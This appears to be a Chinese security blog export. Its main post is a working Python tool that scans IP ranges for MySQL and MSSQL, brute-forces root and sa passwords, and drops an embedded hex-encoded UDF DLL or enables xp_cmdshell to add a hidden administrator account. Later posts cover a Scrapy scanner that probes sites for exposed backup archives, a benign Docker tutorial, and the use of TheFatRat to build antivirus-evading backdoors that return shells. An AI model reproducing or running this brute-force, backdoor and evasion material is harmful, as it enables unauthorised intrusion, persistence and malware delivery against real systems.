获取3306端口是否开放，开放后猜测root密码，密码猜测成功后，执行写入udf.dll，利用udf添加账号密码 。 获取1433端口是否开放，开放后猜测sa密码，密码猜测成功后，执行xp_cmdshell，2005以上就默认关闭了，获取sa权限之后重新开启，但还是需要在2008之前，利用xp_cmdshell写入远程账号密码。不过当用户已AUTHORITY\\NetworkService登陆时时（mssql2005express版默认）无法执行net user命令添加用户。只考虑了开启或者关闭xp_cmdshell的情况，删除的话暂不处理。 以上只针对Windows系统，数据库版本不高。 之所以采用这两种形式，一旦可以写入的话，即便没开启远程桌面，也可以利用udf或者xp_cmdshell开启远程桌面。 本地需要ip.txt 写入测试的IP网段，成功的会写入本地mysql，或者mssql 的txt文件。 如此，直接上代码，本地测试mysql没发现问题，如有考虑不周的或者认识错误的请告知。 `#coding:utf-8 import MySQLdb import pymssql import IPy import threading import Queue import socket import binascii class thread(threading.Thread): def init(self,queue): threading.Thread.init(self) self._queue = queue def run(self): while not self._queue.empty(): queue = self._queue.get(timeout=0.5) try: sock = socket.socket() sock.settimeout(2) try: sock.connect((queue, 3306)) print u&quot;检测到&quot; + queue + u&quot;:3306端口开放，测试中。。。&quot; self.mysql(queue) except: print queue + u&#39;:3306 端口关闭&#39; try: sock.connect((queue, 1433)) print u&quot;检测到&quot; + queue + u&quot;:1433端口开放，测试中。。。&quot; self.mssql(queue) except: print queue + u&#39;:1433 端口关闭&#39; except: continue def mysql(self,queue): with open(&#39;mm.txt&#39;,&#39;r&#39;) as f: file = f.readlines() for mm in file: try: db = MySQLdb.connect(queue, &quot;root&quot;, mm.strip(&#39;\\n&#39;), &quot;mysql&quot;, connect_timeout=2) print u&quot;爆破%s:3306端口成功，账号密码为: root/%s&quot; %(queue, mm.strip(&#39;\\n&#39;)) cursor = db.cursor() cursor.execute(&quot;SELECT VERSION()&quot;) data = cursor.fetchone() udf = binascii.a2b_hex(&quot;4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000F80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000004D477BD0092615830926158309261583005E86830B261583005E808308261583005E968307261583005E91830B2615832EE06E830A2615830926148325261583005E9C8308261583005E878308261583005E8483082615835269636809261583000000000000000000000000000000000000000000000000504500004C0103004AFE9F5A0000000000000000E00002210B010900001000000010000000600000607C0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007C83000008020000B4820000C800000000800000B402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002C7E00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000E0555058310000000000100000007000000010000000040000000000000000000000000000400000E02E7273726300000000100000008000000006000000140000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D090208B92BCF11B11CEEA24F550000560C000000220000260000A8FFFFFFFF8B4C240833C03901741656578B7C24146A0C59BE000010DCF3A566A55FB0015E5DFB77FBC38B44240C1A6A071611108BF8183218FF63DB6F1CA45FC7011E1200210883380175128B40040DF6776F0700750A1004C6000132C0C3530ABF1DF68D3C3053A454082D08FF30FF15FFF6EE776C885985C075085614C601011BC8568D71018A11FD6FDFFE4184D275F98B54142BCE890A32558BEC8B4D0C833902B7D860BF5374148B7D10915C5453EB4CBF9DBDDF8B417D740F1B707C1BEBE5836004DBB1FFB7001A0C8B48048B008D4401025072A0594C08DFC8D7B5891678113006A44CEB6C57BEB7B2B85F5E5DA30421740833DBB63FF6A8591353568B742410D878534602DB85DB5BB6460851C78D5C4257E8240B75EEEEBFE01400C604070008FF70041E0553B1DB1B921A22C418535720030054090F09B7086A995B0F98599954CF2D343713B8F4540B1EDEB60D818403552251519D35DFFED6FEDF576800F762D66A018945FC068BF08B4560DD7FF70CC606004533FF595939387471683CC071C6FEDFDA9C12260C3BC7745B506A04FF75FC149073E1EDD7A9FD48533AFC8D48911040B963DBFF2BC18BD88D043B505630F8268C5330D8AD8DBD5F03FE570E940DE57DF8463FE6364C2066BA5B1810A4803E0059169EB0FF741A8BC6C64437FF00594D1489C906987BEBD86F183E5F205EC9C3EED7B235DCBAF37D574708C45030087BDBDACDC9C26A4078C710548D4601B9E07E614251724F0856FF31CF6BAFDD9DB694C66AFF8DC32082F63A58B0B6030D092C23005F7CC36E57036C6A081D1290AC0AA88365FC2F6C2F2C2D4592D0EB071B408F65E8C70BBFD66E42FEFF000D1FEDC25E3BFFDB17B60D08209A02F3C3E90806F58BFF56688000002D8C6D675880985608845AA3BDE0FEBB062358045485F675054DAA83260076FBB7DB4508C36F08ED09ACC704240607FF0B4C113637598D71FFCF9C0BBF77DFC9750E39056B107E3CFF7310830B01FBEEC6BB8B0910548B098F57890A23480F85D47D618CBBAD641718068B79040838071B76EDEEBB1E50EB184AA705B8E61768B0B030D8E803A83C0957C1D6BBAEB5D6A1E7E9E2573CA12F4C6A6FF777C3025EFD096A1FEE76EB3CAA10C80475ED7BEFC0C7051F281A70E027071BDFF79D5CB520BC04B81B6A5635B952EB782B7339B2E3696FF7DEFD7340393D155C741C68062809AC43DB6B85850D9E1034252316FFE666F862F154B201DC0801592CC2B1A1DB78049DDFDBF62413D90FD4FC83F80266B16F6CB0D2595BFFA0584B77783BB5783106350F8487C71996EE4CD3543BF81810897D82EFC796BE35FAC87251833F8AF36A7C398587B4F10774E9FFC8D60F7C89C5DB9BB5D955F85615441B474DED5BE38EF88A394D1003D00874B48909437AA36D020C1AD3F8EBA71C3162CC5A64442E386161FB0A58064C32FC19503F1BDF720443375BC9C20CC710FB02231FB2288B2EF28B5D081CAE0FDB9B54E433C95CFC7D2008016C2DC6C23BF15A393A4417E4D61BFE7FAFAE3BF0740583FE02752E1910D03BC1E7166EB8ED57565FD03B5EE40003937B703B67115A039614168012376C7D270A8227FEA0246420575062B30D661327002F527F8DF61AD2061153F76A037543B067BB614F34032168742E2C0D2C3CEC257FEB1B71EC5A09706A7C6FAAE05051597C64825D900EADF62FFA8A19066B8F91B6C72AE490C396EC1640E134A9FF3B246ABB41C1F17926547DBC550C0D381E33BC05BC595D382281EC2832F7869F365F212043211C895E2118891D05F78EC243143C21A2AA210C668C186C5FFBDA3806252C0620080605DD2DCDD20425002D7FFC9C8F7AB6B1F6143095562407042831D6FEDB7F0807348B85E0FCA0AA701DDBB5B395011C1920241318092B18476A565F201CB360C32C9F7B8985D8320A04DC03B557E01B243468DEDFD1F7D8D360CE2879D40A2C833D208DBDC3DA00F923685B1B300BDFAF67F534C97F23401EC25F6A4849918F144A50152E9DF458AAF8A29C10F3EB67611C7E052C37D4598FEDED8321B9273551E0F5EE3BDC0ABF03E4507F4B8417185BDB7E600BCE1CDC142CD6E288B154B609E01B14F413160A4BDB313DDCDBFFDC84676CC859D94E1E07F7D81BF076BBB7C00359485D1656B8BC18BE04A3638B6F2AF83BC673080753025073D85F60835A3BFE72F15F5E25206C6053C820CC006F35B4DD452BB84D5A346627040B85BF2B5E6E413C03C1813850E45FEFA5ECFFFB33D2B90B011C48180F94C28BC25DC33FB702BF35E34831C80FB74114AE057106C1A55B6C33578C081817761BFFFF2FF1D7487BF972098B580803D93BFB720A4283C0283BD67270CA36B5E86AE55DC38F6AFEF0CD71F7A970040B056418005083EC080DB7C670082F316C33C576F0852F06DF64A31A89B90968555DB7F081F0B2091C6B04F555972DD12C937D1350195C083B04E1C26F2724C1E81FF715E0018FEFB6532B034F230059948BE55DC3621DDB49A301CA3DAFC0FAE99525242631CCFF29343232B61058054C50AC2CB41E97AF12B60D56096B27D7616B20CFB0FBEF2AE4E03160031F73D9665B9A6C038D2BE0FAFC046BA039F13CB4FC8A0D6C120C7D0DC395C3C1619C965154147FE41F3E783124F020140BDAC40E5643B25D53EC1068F885626DF4F888C9BF4EE640BB25EEA0398466820D85C33149DB9F0A359A04EB605675F869639FC1F6448B7598751F1033F0071476E6CA20189D271CB4F6EE6FEDF4330C113BF77507BE4F59EB0B85F30A7B047EA10AC1E0100BF0CE00F7D6076C840D1E045E5F01C33F5C05646464646064686C1405766474B000003FF4C20E034B0F20185F4E6F20FFFFB7FF617267756D656E7473096C6C6F77656420287564663A206C69625F6DCCFD6DF77973716C0D5F73085F696E666F293918DFB6FF8F2076657273696F6E20302E01341F45787065F6DBDBDD637447657861076C79201A65207374723F5BDB5AFB672074791B75726171217258C00E602B7477911FD86F030B3F8672206E616D48DBB1B71F436F756C246E6F74C4636113203058B76D186D2779AF72F1483FDA4D943F2003121071051BF29D5860214707D0604D0D0B0F81CB074ED961DD9703AB17CC2708A77527ECC00FD81F0A3B034FC0A07B851F03240328C1556583A200C5889251CA22D877BDB119BF44FF000F5565A3AA00A8AA9251645455C95532AAAAFFF61D455C0410020157616974466F00FC06C07253886C654F626A07C07F6B99145669727475616C417603E0F6370D536574456E76126F6EC000BC6DBF5661726961622B4118437265F76DEB6E94546806640D47264375727222CD12F65B502A636573734914266E03E083135469636BDE6E6BB1F6B6FD5175657279500366846D616E371667EF1B00FD0144697367374CFDB7EDED6962727879436192731A4973446562756767EDEE6DAD266A686546A4556E6840B1B7B7B7643164457846707469AF46696C4A6D295B6119B41254DE64AEB0176D0DD8114990B9EDD61A0A6B409D6D70876547C25A73CD517F77555122B4ED6E591B5C537973186DEEC3C2EB2E39417373650975697CDB15DA434C7D5F687E396D5F2EDFFEDEBE5F616D7367087869740B646A753A5F666469EC4217B076260A639A5F64FD6CADB91F5F686F6F6B131459725FF802700148D15FDB9CEB0249730A330A6C21D6F0BD82539C2A64D46E640893050B130F651E6B5B7BC25F2C723456ED6D1C182FF6D69A700A035F706F522947E1DDBE6E106468756C5EB92A6BCB92BD9B1B2CA806E0B6D86E6EC57265250866112E827BDB5673749C637079082439EDCD5C6B32C06E4D0FD7ED1F5AC36F7319663A1F5F4370705831C75E3B8474BC6D343F001817FFFFFFFF3D193C1C1B161E55142D16270815270F11115F10130A070D2E17090705160C1E7FFBFFFF080A0B160918181505061B050C10060717062105110F061421110B08E4FBDFB62B22052A111D0D18532D483806000776FBDBE5080C09330A090B0C051007061612EEDFFEED0E0B34150B18160D3D0542C205121E14066930FFD8DDFF110C0E1D4D0517230D0C3224080B4506F0DE041004F03B0A6EFF2C01043808041C1C0204003E4C016DFF21FD05004AFE9F5A8FE00002210B0109080C634F7AD60C1213D616A300200E10C10A01630B02AB3362B7EE6107006003040233351EEED9C0CE34100706C02633D6EDDB7620AC22033C144002B0021C5759DD0050520143C8C8BA65B1214200A7B82F06DB5D182EB4787407EA0B900C5BFA90CDB742602E72647D610861C90E76C508FB0A00C700A1DB66BB77402E26300304301BECDB943D001A27C04F73726300EB11C0061B40731C4F78C2C2A365761F01030002ED7760497B27421BA023030000EDD8D152127C53030400000000000080FF00000000000000000000807C2408010F85B901000060BE007000108DBE00A0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B92A0000008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE005000008B0709C0743C8B5F048D8430B472000001F35083C708FF96F0720000958A074708C074DC89F95748F2AE55FF96F472000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAEF87200008DBE00F0FFFFBB0010000050546A045357FFD58D871702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E9AD98FFFF0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005C80000056020000E404000000000000584000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C656765733E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365223E3C2F726571756573746564457865637574696F6E4C6576656C3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564339302E435254222076657273696F6E3D22392E302E32313032322E38222070726F636573736F724172636869746563747572653D2278383622207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E504100000000000000000000000010830000F08200000000000000000000000000001D83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004B45524E454C33322E444C4C004D5356435239302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C467265650000006672656500000000000000004AFE9F5A0000000058840000010000001200000012000000A4830000EC8300003484000021100000A312000000100000A4120000A3120000A0120000CC110000A31200009811000086110000A31200009811000076100000A3120000431000002E1100001A110000A91000006D84000083840000A0840000BB840000C7840000DA840000EB840000F484000004850000128500001B8500002B8500003985000041850000508500005D850000658500007485000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000700000100000006D3C683E6C3E0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;) if (data[0][0] &lt; 5) or ((data[0][0] == 5) and (data[0][2] &lt;= 1)): try: basedir = &quot;select &#39;%s&#39; into dumpfile &#39;c:\\\\windows\\\\system32\\\\udf.dll&#39;;&quot; %udf cursor.execute(basedir) cursor.execute(&quot;create function sys_eval returns string soname &#39;udf.dll&#39;;&quot;) cursor.execute(&quot;select cmdshell(&#39;net user wait wait /add&#39;);&quot;) cursor.execute(&quot;select cmdshell(&#39;net localgroup administrators wait /add&#39;);&quot;) with open(&quot;mysql.txt&quot;, &#39;a&#39;) as fs: fs.write(queue + u&quot;:3306 账号密码为 root/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm print queue + u&quot; udf 创建成功生成远程账号密码为：wait/wait&quot; except: print u&quot;udf执行失败&quot; else: try: cursor.execute(&quot;select @@basedir;&quot;) dir = cursor.fetchone() basedir1 = &quot;select &#39;plugin&#39; into dumpfile &#39;%s&#39;;&quot; %(dir[0]+&quot;lib/plugin::$INDEX_ALLOCATION&quot;) basedir2 = &quot;select &#39;%s&#39; into dumpfile &#39;%s&#39;;&quot; %(udf, dir[0]+&quot;lib/plugin/udf.dll&quot;) cursor.execute(basedir1) cursor.execute(basedir2) cursor.execute(&quot;create function sys_eval returns string soname &#39;udf.dll&#39;;&quot;) cursor.execute(&quot;select cmdshell(&#39;net user wait wait /add&#39;);&quot;) cursor.execute(&quot;select cmdshell(&#39;net localgroup administrators wait /add&#39;);&quot;) with open(&quot;mysql.txt&quot;, &#39;a&#39;) as fs: fs.write(queue + u&quot;:3306 账号密码为 root/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm print queue + u&quot; udf 创建成功生成远程账号密码为：wait/wait&quot; except: print u&quot;udf执行失败&quot; db.close() break except: continue def mssql(self,queue): with open(&#39;mm.txt&#39;,&#39;r&#39;) as f: file = f.readlines() for mm in file: try: db = pymssql.connect(host=queue, user=&quot;sa&quot;, password=mm.strip(&#39;\\n&#39;), database=&quot;master&quot;, connect_timeout=2) print u&quot;爆破%s:1433端口成功，账号密码为: sa/%s&quot; %(queue, mm.strip(&#39;\\n&#39;)) cursor = db.cursor() try: cursor.execute(&quot;exec master..xp_cmdshell &#39;whoami&#39;;&quot;) except: cursor.execute(&quot;EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;&quot;) try: cursor.execute(&quot;exec master..xp_cmdshell &#39;net user wait wait /add&#39;;&quot;) cursor.execute(&quot;exec master..xp_cmdshell &#39;net user administrators wait /add&#39;;&quot;) with open(&quot;mssql.txt&quot;,&#39;a&#39;) as fs: fs.write(queue+&quot;:1433 账号密码为 sa/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm.strip(&#39;\\n&#39;) except: print queue + u&quot; xp_cmdshell 执行失败&quot; db.close() except: continue def main(): queue = Queue.Queue() threads = [] with open(&quot;ip.txt&quot;) as f: file = f.readlines() for i in file: ip = i.strip(&#39;\\n&#39;) for x in IPy.IP(ip): queue.put(x) for i in xrange(1): threads.append(thread(queue)) for i in threads: i.start() for i in threads: i.join() if name == “main“: main() `","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"基于scrapy的备份文件扫描","slug":"基于scrapy的备份文件扫描","date":"2018-09-27T02:51:38.000Z","updated":"2018-09-27T03:12:06.941Z","comments":true,"path":"2018/09/基于scrapy的备份文件扫描/","link":"","permalink":"/2018/09/基于scrapy的备份文件扫描/","excerpt":"","text":"Scrapy，Python开发的一个快速、高层次的屏幕抓取和web抓取框架，用于抓取web站点并从页面中提取结构化的数据。Scrapy用途广泛，可以用于数据挖掘、监测和自动测试。 首先生成项目文件 scrapy startproject spiderdata 生成成功后，会有以下目录结构，首先在spiderdata中的spider目录创建我们的spider文件。 备份文件扫描文件名，有两个选择，一是基于字典，二是根据url的备份文件名，从以往发现备份文件的结果上看，两种方式都是经常存在使用的。 于是创建backup文件，用来生成备份文件名，创建一个列表用来存储字典文件名，另外创建一个方法用来基于url生成备份文件名。 #coding:utf-8 import urlparse class backup(object): def __init__(self, url): self.url = url self.list2 = [&#39;/db.zip&#39;, &#39;/fdsa.rar&#39;, &#39;/ftp.rar&#39;, &#39;/gg.rar&#39;, &#39;/hdocs.rar&#39;, &#39;/hdocs.zip&#39;, &#39;/a.zip&#39;, &#39;/web.zip&#39;, &#39;/web.rar&#39;, &#39;/1.rar&#39;, &#39;/bbs.rar&#39;, &#39;/www.root.rar&#39;, &#39;/123.rar&#39;, &#39;/data.rar&#39;, &#39;/bak.rar&#39;, &#39;/oa.rar&#39;, &#39;/admin.rar&#39;, &#39;/www.rar&#39;, &#39;/2014.rar&#39;, &#39;/2015.rar&#39;, &#39;/2016.rar&#39;, &#39;/2014.zip&#39;, &#39;/2015.zip&#39;, &#39;/2016.zip&#39;, &#39;/2017.zip&#39;, &#39;/1.zip&#39;, &#39;/1.gz&#39;, &#39;/1.tar.gz&#39;, &#39;/2.zip&#39;, &#39;/2.rar&#39;, &#39;/123.rar&#39;, &#39;/123.zip&#39;, &#39;/a.rar&#39;, &#39;/a.zip&#39;, &#39;/admin.rar&#39;, &#39;/back.rar&#39;, &#39;/backup.rar&#39;, &#39;/bak.rar&#39;, &#39;/bbs.rar&#39;, &#39;/bbs.zip&#39;, &#39;/beifen.rar&#39;, &#39;/beifen.zip&#39;, &#39;/beian.rar&#39;, &#39;/data.rar&#39;, &#39;/data.zip&#39;, &#39;/HYTop.rar&#39;, &#39;/root.rar&#39;, &#39;/Release.rar&#39;, &#39;/Release.zip&#39;, &#39;/sql.rar&#39;, &#39;/test.rar&#39;, &#39;/template.rar&#39;, &#39;/template.zip&#39;, &#39;/upfile.rar&#39;, &#39;/vip.rar&#39;, &#39;/wangzhan.rar&#39;, &#39;/wangzhan.zip&#39;, &#39;/web.rar&#39;, &#39;/web.zip&#39;, &#39;/website.rar&#39;, &#39;/www.rar&#39;, &#39;/www.zip&#39;, &#39;/wwwroot.rar&#39;, &#39;/wwwroot.zip&#39;, &#39;/wz.rar&#39;] def backup(self): list_a = [] parse = urlparse.urlparse(self.url) name = parse.netloc.split(&#39;.&#39;) name_url = parse.netloc.replace(&#39;.&#39;, &#39;&#39;) for i in [&#39;.rar&#39;, &#39;.zip&#39;, &#39;.tar.gz&#39;, &#39;.7z&#39;]: list_a.append(parse.scheme + &#39;://&#39; + parse.netloc + &#39;/&#39; + parse.netloc + i) #http://www.baidu.com/www.baidu.com.zip if &#39;www&#39; in name: list_a.append(self.url + &#39;/&#39; + name[1] + i) #http://www.baidu.com/baidu.zip list_a.append(self.url + &#39;/&#39; + &#39;&#39;.join(name[1:]) + i) #http://www.baidu.com/baiducom.zip else: list_a.append(self.url + &#39;/&#39; + name[0] + i) #http://www.baidu.com/baidu.zip list_a.append(self.url + &#39;/&#39; + name_url + i) #http://www.baidu.com/wwwbaiducom.zip for x in self.list2: list_a.append(self.url + x) return list_a 在spider的爬虫文件中使用以下代码 #coding:utf-8 import scrapy from backup import backup from ..items import SpiderdateItem class spiderdata(scrapy.Spider): name = &quot;spiderdata&quot; content_type = [&#39;application/x-rar&#39;,&#39;application/x-gzip&#39;,&#39;application/zip&#39;,&#39;application/octet-stream&#39;,&#39;application/x-7z-compressed&#39;] def start_requests(self): with open(&#39;ip.txt&#39;,&#39;r&#39;) as f: for i in f.readlines(): ip = i.strip(&#39;\\n&#39;) back = backup(ip) url_ip = back.backup() for x in url_ip: yield scrapy.Request(x, callback=self.parse,dont_filter=True) def parse(self, response): item = SpiderdateItem() if response.headers[&#39;Content-Type&#39;] in self.content_type: print &quot;[&quot; + str(response.status) + &quot;]&quot; + u&#39; 检测到存在备份文件的URL: &#39;+ response.url item[&#39;url&#39;] = response.url yield item 调用之前创建的备份文件名函数，使用start_requests来生成一个可迭代对象。 数据通过item来保存本地，所以在items中创建一个参数，并且在settings中开启item管道。 url = scrapy.Field() 在piplines中创建本地文件保存文件，创建一次文件对象，写入后根据 爬虫关闭后再关闭本地文件。 def __init__(self): self.f = open(&quot;url.txt&quot;,&#39;w&#39;) def process_item(self, item, spider): self.f.write(item[&#39;url&#39;].encode(&quot;utf-8&quot;)+&#39;\\n&#39;) return item def close_spider(self, spider): self.f.close() 因此只需在spiderdata中创建ip.txt文件即可，写入需要检测的url，另外如果不想看到scrapy的log输出，可以用在setting中添加如下： LOG_LEVEL = &#39;WARNING&#39; 只显示warning级的log输出.","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"使用docker创建镜像","slug":"使用docker创建镜像","date":"2018-09-25T06:40:17.000Z","updated":"2018-09-27T02:44:04.358Z","comments":true,"path":"2018/09/使用docker创建镜像/","link":"","permalink":"/2018/09/使用docker创建镜像/","excerpt":"","text":"在测试以及开源工具使用中，docker的便捷越来越成为快速部署的选择，那我们怎么构建自己的docker镜像。 构建Docker镜像有以下两种方法： 使用docker commit命令。 使用docker build命令和 Dockerfile 文件 docker commit命令首先我们在本地拉取ubuntu镜像作为基础的镜像环境。 如果我们在拉取的ubuntu镜像上安装 nginx，使用 docker run -it 镜像名 /bin/bash 这样进入需要修改的镜像内部。 首先按照一般操作步骤， apt-get update apt-get -y install nginx 等待构建结束后，使用exit退出，保存镜像，避免镜像内容丢失。 docker commit 修改的镜像id 用户名/仓库名 结束后便构建了一个设定好的镜像，如下所示。 如果需要上传镜像仓库，在https://hub.docker.com/注册登陆创建仓库即可，然后使用docker login登陆，此处使用的是命令行参数直接登陆。 执行：docker push 用户名/仓库名:标签 在hub.docker上就可以看到镜像信息了： 如需运行构建的docker docker run -d -p 80 --name web_web misakiyui/web nginx -g &quot;daemon off;&quot; –name: 容器名 nginx -g “daemon off;” 表示在镜像内运行的命令，在前台开启一个nginx进程 访问映射端口32768则可以看到安装的nginx了。 Dockerfile使用docker commit现在已经不推荐，推荐使用更为灵活的Dockerfile来构建镜像，如下Dockerfile，同样是在ubuntu下构建nginx FROM ubuntu:18.04 MAINTAINER misaki RUN apt-get update &amp;&amp; apt-get -y install nginx RUN echo &quot;hello world&quot; &gt; /var/www/html/index.nginx-debian.html EXPOSE 80 新建目录web，此目录就是构建环境目录。在Dockerfile中写入如下命令，FROM指构建环境，这里选用ubuntu 18.04版本，必须为第一行信息，注意这里都要小写，MAINTAINER指作者信息，RUN指在构建环境中需要运行的命令，每一个RUN都意味着建立一层，层数过多增加构建部署时间，也容易出错，所以尽量使用&amp;&amp;，在一层中构建命令。EXPOSE指应用程序使用容器的指定端口，设为80。也就是Dockerfile其实就是安装的每一条命令都写在一个文件内，这样运行后，程序自动的执行安装更新配置等等。 运行 docker run -t=&quot;misakiyui/web&quot; . (点是必须的)开始构建镜像 构建完成后再docker images中便可以看到设定的镜像了 运行 docker run -d -p 80 --name web_web misakiyui/web nginx -g &quot;daemon off;&quot; 开启镜像 这时候查看映射到本地的端口docker ps，本地映射32772端口，访问后就可以看到修改的信息和nginx了 。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"关于Thefatrat免杀使用","slug":"关于Thefatrat免杀使用","date":"2018-09-20T03:07:18.000Z","updated":"2018-09-20T05:18:56.082Z","comments":true,"path":"2018/09/关于Thefatrat免杀使用/","link":"","permalink":"/2018/09/关于Thefatrat免杀使用/","excerpt":"","text":"最近尝试了免杀工具thefatrat，记录一些使用过程和坑： 常见的免杀方式一般是：文件免杀方法和内存免杀方法 文件免杀指：加壳、加花等。内存免杀指：修改内存特征码、修改字符串等。 推荐一篇博文：http://anhkgg.com/aanti-virus/ 下面就记录thefatrat的使用和杀软查杀结果：采用在线查杀https://www.virustotal.com和http://www.virscan.org/language/zh-cn/ thefatrat的项目地址为：https://github.com/screetsec/thefatrat 安装步骤为： git clone https://github.com/Screetsec/TheFatRat.git cd TheFatRat chmod +x setup.sh &amp;&amp; ./setup.sh 安装后，建议查看logs文件夹下的fudwin文件,记录了安装使用中的存在的问题，比如使用中会出现There was an error creating your FUD rat with Powerstager 这种错误，查看fudwin文件，可以看到py2没有安装names模块，安装后正常使用。 再给以下文件权限 chmod + x fatrat chmod + x powerfull.sh ./fatrat 启动界面 第一项：利用msf生产后门，基本没免杀效果 第二项 ：利用powerstager混淆，从结果来看效果不错 第三项和第四项使用中报错和不能选择的问题，尚不得知问题原因，后续更新 第五项：生成apk后门 第六项：这个就是可以创建bat后门，但是里面还有c#编译和c编译等，但是被查杀率极高 第七项：生成office类后门 第八项：生成Linux后门 此次针对windows系统，下面用第二项的fudwin，进入后 使用第一项，第二项不确定是不是编码原因，全是乱码，选择后可以看到提示的本地IP和公网IP 执行完成后，在output文件夹下生成制定的exe文件，中间会选择图标 利用https://www.virustotal.com查看下效果如何，从结果上看不是很优秀，不过比较意外的是，360居然没查杀，国内几家免费杀软都没识别 尝试使用http://www.virscan.org/检查文件 结果更少，只有四个查杀(不确定是不是引擎版本问题) 从两个结果看 两边能查杀的国内杀软就江民杀毒，F-Secure在VirusTotal可以查杀，在VirSCAN没有查杀 运行文件查看是否能正常执行获得shell。 运行后用msf做监听，可以看到收到了shell thefatrat比较出众的一点就是可以生成bat后门文件，选择Create Fud Backdoor 1000% with PwnWinds 在程序output文件夹下的bat上传到 https://www.virustotal.com 被360查杀，但是能过江民，F-Secure，和国内其他家杀软 同样用msf监听执行情况，可以收到shell 以上文件在电脑管家和火绒环境下，静态查毒或者运行都不查杀。 在采用Create Fud 100% Backdoor with Fudwin 1.0中的Powerstager 0.2.5 by z0noxz (powershell)生成exe文件，再用upx加壳 Upx -7 aaa.exe 这个结果还算是能看，能查杀基本完全脱离国内杀软了 